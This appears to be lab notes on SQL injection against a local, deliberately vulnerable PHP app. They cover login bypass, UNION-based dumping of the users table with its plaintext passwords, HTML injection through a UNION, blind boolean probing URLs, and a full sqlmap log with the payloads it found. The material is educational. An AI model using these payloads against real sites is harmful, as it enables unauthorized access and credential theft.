### login1.php

```sql
admin' -- 
```

### login2.php

```sql
admin') -- 
```

### searchproductz.php

```sql
b%' ORDER BY 5 -- //
```

```sql
' UNION SELECT 1,2,3,4,5 -- //
```

```sql
' UNION SELECT null, id, username, password, fname FROM users -- //
```

| **Name**  | **Passwords** |
|-----------|---------------|
| admin     | admin         |
| bobby     | password      |
| ramesh    | troll         |
| suresh    | troll         |
| alice     | alice1        |
| voldemort | horcrux       |
| frodo     | frodo         |
| hodor     | hodor         |
| rambo     | rhombus       |

```
' UNION SELECT 1,'<img src="http://address"><img>',3,4,5 -- //
```

```
<img src="http://address"><img>
```

The previous code is a code snippet  that represents an image on html where the source is at the address http://address, this is used with SQLi to inflict html code injection on the website.

### SQL Second order attacks

```
' or 1 in (SELECT @@version) -- //`
```

### Blind Injection

The page gives us information about a user by giving the params on the url, for example:

```
http://127.0.0.1:8000/blindsqli.php?user=bob
```

We can then take advantage of this and try to check if the id column exists in the database 

```
http://127.0.0.1:8000/blindsqli.php?user=bob%27%20AND%20SUBSTRING((select%20id%20from%20users%20LIMIT%201),%201,%201)%3E0%20%20--%20//
```

We can also try to get the number of users the DB has by itereating the var variable and see when does the DB respond with true (give us a result)

```
bob' AND (SELECT COUNT(*) FROM users) = <var> -- //
```

```
http://127.0.0.1:8000/blindsqli.php?user=bob' AND (SELECT COUNT(*) FROM users) = 12 -- //
```

or (url encoded)

```
http://127.0.0.1:8000/blindsqli.php?user=bob%27%20AND%20(SELECT%20COUNT(*)%20FROM%20users)%20=%2012%20--%20//
```

We can also try to check if there are at least one user with 'a' at the beggining of the username by doing the following:

```
http://127.0.0.1:8000/blindsqli.php?user=bob' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') >= 1 -- //
```

or (url encoded)

```
http://127.0.0.1:8000/blindsqli.php?user=bob%27%20AND%20(SELECT%20COUNT(*)%20FROM%20users%20WHERE%20username%20LIKE%20%27a%%27)%20%3E=%201%20--%20//
```

### sqlmap

Automated exploitation with the tool, sqlmap:

```bash
user@vm:~$ sqlmap -u http://localhost:8000/blindsqli.php?user=bob
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:42:39 /2021-10-23/

[13:42:40] [INFO] testing connection to the target URL
got a 302 redirect to 'http://localhost:8000/login1.php?msg=2'. Do you want to follow? [Y/n] n
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=d0a22cee3a4...cdcbdf7afd'). Do you want to use those [Y/n] Y
[13:42:45] [INFO] testing if the target URL content is stable
[13:42:45] [WARNING] GET parameter 'user' does not appear to be dynamic
[13:42:45] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
[13:42:45] [INFO] testing for SQL injection on GET parameter 'user'
[13:42:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:42:45] [INFO] GET parameter 'user' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[13:42:45] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:43:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:43:00] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:43:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:43:00] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:43:00] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:43:00] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:43:00] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:43:00] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:43:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:43:00] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:43:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:43:00] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:43:00] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:43:00] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[13:43:00] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[13:43:00] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[13:43:00] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[13:43:00] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[13:43:00] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[13:43:00] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:43:00] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[13:43:00] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[13:43:00] [INFO] testing 'Generic inline queries'
[13:43:00] [INFO] testing 'MySQL inline queries'
[13:43:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:43:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:43:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:43:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:43:00] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[13:43:00] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[13:43:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:43:20] [INFO] GET parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:43:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:43:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:43:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:43:20] [INFO] target URL appears to have 5 columns in query
[13:43:20] [INFO] GET parameter 'user' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
N
sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=bob' AND 8402=8402 AND 'wkrA'='wkrA

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=bob' AND (SELECT 1436 FROM (SELECT(SLEEP(5)))EKcx) AND 'tGOc'='tGOc

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: user=-3576' UNION ALL SELECT NULL,CONCAT(0x71707a6a71,0x51586f494757775a685049685841427a79497155666842714c4377714a624971566c6c43714b4351,0x7176787871),NULL,NULL,NULL-- -
---
[13:43:41] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[13:43:41] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/localhost'
[13:43:41] [WARNING] you haven't updated sqlmap for more than 568 days!!!

[*] ending @ 13:43:41 /2021-10-23/

user@vm:~$
```
